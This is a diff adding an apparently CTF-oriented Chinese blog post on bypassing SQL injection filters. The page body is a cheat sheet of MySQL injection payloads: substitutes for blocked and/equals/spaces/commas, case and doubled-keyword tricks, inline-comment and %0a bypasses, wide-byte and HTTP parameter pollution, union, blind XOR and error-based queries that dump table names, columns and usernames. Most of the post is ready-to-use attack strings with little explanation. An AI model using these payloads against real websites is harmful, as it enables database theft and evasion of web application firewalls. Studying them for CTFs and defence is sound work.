@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TvT">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sql注入绕过 之前也收集了sql注入过滤的一些绕过，但是很乱所以我根据注入的一般过程进行了一次梳理  进行判断闭合符号数字的替换12id&#x3D;1 and 1&#x3D;1id&#x3D;1 and true&#x3D;true  可以变更为true and的替换12id&#x3D;1 and 1&#x3D;1id&#x3D;1 &amp;&amp; true&#x3D;true  等号的过滤123456id&#x3D;1 and 1&#x3D;1id&#x3D;1 and true like tr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入绕过">
+<meta property="og:url" content="http://example.com/2023/04/24/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="TvT&#39;Blog">
+<meta property="og:description" content="sql注入绕过 之前也收集了sql注入过滤的一些绕过，但是很乱所以我根据注入的一般过程进行了一次梳理  进行判断闭合符号数字的替换12id&#x3D;1 and 1&#x3D;1id&#x3D;1 and true&#x3D;true  可以变更为true and的替换12id&#x3D;1 and 1&#x3D;1id&#x3D;1 &amp;&amp; true&#x3D;true  等号的过滤123456id&#x3D;1 and 1&#x3D;1id&#x3D;1 and true like tr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/4.jpg">
+<meta property="article:published_time" content="2023-04-24T11:53:53.426Z">
+<meta property="article:modified_time" content="2023-04-24T11:53:07.992Z">
+<meta property="article:author" content="TvT">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/4.jpg">
+  
+  
+  
+  <title>sql注入绕过 - TvT&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="TvT'Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TvT</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/preview.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sql注入绕过"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-24 19:53" pubdate>
+          2023年4月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sql注入绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><blockquote>
+<p>之前也收集了sql注入过滤的一些绕过，但是很乱所以我根据注入的一般过程进行了一次梳理</p>
+</blockquote>
+<h2 id="进行判断闭合符号"><a href="#进行判断闭合符号" class="headerlink" title="进行判断闭合符号"></a>进行判断闭合符号</h2><h3 id="数字的替换"><a href="#数字的替换" class="headerlink" title="数字的替换"></a>数字的替换</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1<br><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">true</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>可以变更为true</p>
+<h3 id="and的替换"><a href="#and的替换" class="headerlink" title="and的替换"></a>and的替换</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1<br><span class="hljs-attribute">id</span>=1 &amp;&amp; <span class="hljs-attribute">true</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="等号的过滤"><a href="#等号的过滤" class="headerlink" title="等号的过滤"></a>等号的过滤</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and true like true//<br><span class="hljs-attribute">1</span> and <span class="hljs-number">1</span> regexp <span class="hljs-number">1</span><br><span class="hljs-attribute">1</span> and <span class="hljs-number">3</span>&gt;<span class="hljs-number">1</span><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and <span class="hljs-number">1</span> in (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+
+<p>即要在and右边构成一个可以返回真的一个式子</p>
+<h3 id="空格的替换"><a href="#空格的替换" class="headerlink" title="空格的替换"></a>空格的替换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and/**/<span class="hljs-number">1</span>=<span class="hljs-number">1</span>//使用注释符号<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and%a01=<span class="hljs-number">1</span>//使用url编码<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and/*!<span class="hljs-number">9999991</span>*/<span class="hljs-number">1</span>=<span class="hljs-number">1</span>//内联注释<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。</p>
+</blockquote>
+<h3 id="字符过滤"><a href="#字符过滤" class="headerlink" title="字符过滤"></a>字符过滤</h3><blockquote>
+<p>如单双引号这种</p>
+</blockquote>
+<p>这个就比较麻烦了，当也不是什么办法都没有，可以使用宽字节注入。</p>
+<blockquote>
+<p>宽字节注入<a target="_blank" rel="noopener" href="https://blog.csdn.net/helloc0de/article/details/76180190">https://blog.csdn.net/helloc0de/article/details/76180190</a></p>
+</blockquote>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;<br><span class="hljs-number">1</span><span class="hljs-comment">%df&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="查询字段数量"><a href="#查询字段数量" class="headerlink" title="查询字段数量"></a>查询字段数量</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">?<span class="hljs-attr">id=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><p>前文已经提到</p>
+<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">?<span class="hljs-attr">id=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br>?<span class="hljs-attr">id=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">ORder</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="进行复写"><a href="#进行复写" class="headerlink" title="进行复写"></a>进行复写</h5><blockquote>
+<p>有一些是对语句关键字进行删除，就可以使用此方法</p>
+</blockquote>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; ororderder <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>/*!order*/ <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; &amp;<span class="hljs-built_in">id</span>=orde&amp;<span class="hljs-built_in">id</span>=r&amp;<span class="hljs-built_in">id</span>= <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ord(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> /*!information_schema.tables*/ <span class="hljs-keyword">where</span> table_schema=database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">1</span> <span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>http污染原理<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/980d3eb8fa68">https://www.jianshu.com/p/980d3eb8fa68</a></p>
+</blockquote>
+<h3 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;1&#x27;</span> union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">2</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="关键字-1"><a href="#关键字-1" class="headerlink" title="关键字"></a>关键字</h4><p>同上文</p>
+<h4 id="逗号的过滤"><a href="#逗号的过滤" class="headerlink" title="逗号的过滤"></a>逗号的过滤</h4><p>使用join</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>     #等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())c<br></code></pre></td></tr></table></figure>
+
+<h3 id="表查询"><a href="#表查询" class="headerlink" title="表查询"></a>表查询</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+
+<h4 id="关键字-2"><a href="#关键字-2" class="headerlink" title="关键字"></a>关键字</h4><h5 id="内联注入进化版-结合普通注释绕过"><a href="#内联注入进化版-结合普通注释绕过" class="headerlink" title="内联注入进化版(结合普通注释绕过)"></a>内联注入进化版(结合普通注释绕过)</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-comment">/*!%23%0agroup_concat(table_name)*/</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/f8827aa5dd19a76569394cee7e3581f758aa15ba.png" srcset="/img/loading.gif" lazyload alt="image-20221215152748443"></p>
+<blockquote>
+<p>即利用#注释一行，和%0a换行符号</p>
+</blockquote>
+<h5 id="where替换"><a href="#where替换" class="headerlink" title="where替换"></a>where替换</h5><p>使用join来进行替换</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(a.<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> a <span class="hljs-keyword">join</span> information_schema.<span class="hljs-keyword">tables</span> b <span class="hljs-keyword">on</span> (a.table_schema=<span class="hljs-keyword">database</span>())<br></code></pre></td></tr></table></figure>
+
+<h5 id="information-schema替换"><a href="#information-schema替换" class="headerlink" title="information_schema替换"></a>information_schema替换</h5><blockquote>
+<p>但是它只能查找表名对于列名没有办法进行查找这时，我们就要运用无列名注入了</p>
+</blockquote>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>即可查出字段</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-number">1</span>^(<span class="hljs-built_in">select</span>(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>((<span class="hljs-built_in">select</span>(<span class="hljs-built_in">group_concat</span>(table_name))<span class="hljs-built_in">from</span>(sys.schema_table_statistics_with_buffer)<span class="hljs-built_in">where</span>(table_schema=<span class="hljs-built_in">database</span>())),&#123;str_num&#125;,<span class="hljs-number">1</span>))&gt;&#123;number&#125;))^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+</blockquote>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">as</span> c,<span class="hljs-number">5</span> <span class="hljs-keyword">as</span> d <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span>)a;<br></code></pre></td></tr></table></figure>
+
+<h5 id="union替换"><a href="#union替换" class="headerlink" title="union替换"></a>union替换</h5><blockquote>
+<p>假如我们此时遇到一个更为极端的情况，union也没法使用</p>
+</blockquote>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">id=<span class="hljs-number">1</span>^(<span class="hljs-keyword">select</span>((<span class="hljs-string">&#x27;1&#x27;</span>,&#123;&#125;)&gt;(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users)))^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>^(<span class="hljs-keyword">select</span>((<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)&gt;(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh)))^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>同上</p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
+
+<p>同上</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span>  ord(substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> ascii((substr(database()/**/from/**/<span class="hljs-number">2</span>/**/<span class="hljs-keyword">for</span>/**/<span class="hljs-number">1</span>)))=<span class="hljs-number">97</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)a))<br></code></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11412#toc-15">https://xz.aliyun.com/t/11412#toc-15</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/page/" class="category-chain-item">page</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/page/ctf/" class="category-chain-item">ctf</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/page/ctf/sql%E6%B3%A8%E5%85%A5/" class="category-chain-item">sql注入</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sql注入绕过</div>
+      <div>http://example.com/2023/04/24/sql注入绕过/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>TvT</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/24/mysql%E6%B3%A8%E5%85%A5%20/" title="mysql注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">mysql注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/24/web-web2/" title="web-web2">
+                        <span class="hidden-mobile">web-web2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
